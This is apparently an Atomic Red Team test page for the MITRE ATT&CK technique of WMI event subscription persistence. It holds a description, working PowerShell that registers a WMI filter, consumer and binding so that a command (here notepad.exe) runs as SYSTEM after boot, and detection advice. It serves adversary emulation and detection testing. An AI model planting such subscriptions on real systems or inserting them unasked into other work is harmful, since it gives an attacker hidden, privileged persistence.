# T1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription
Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. (Citation: Mandiant M-Trends 2015)

Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018)

WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Persistence via WMI Event Subscription
Run from an administrator powershell window. After running, reboot the victim machine.
After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.

Code references

https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af

https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
                CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

Invoke-AtomicTest T1546.003 -TestNumbers 1

## Detection
Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. (Citation: TechNet Autoruns) (Citation: Medium Detecting WMI Persistence)

Monitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1086) cmdlet (Citation: Microsoft Register-WmiEvent), as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).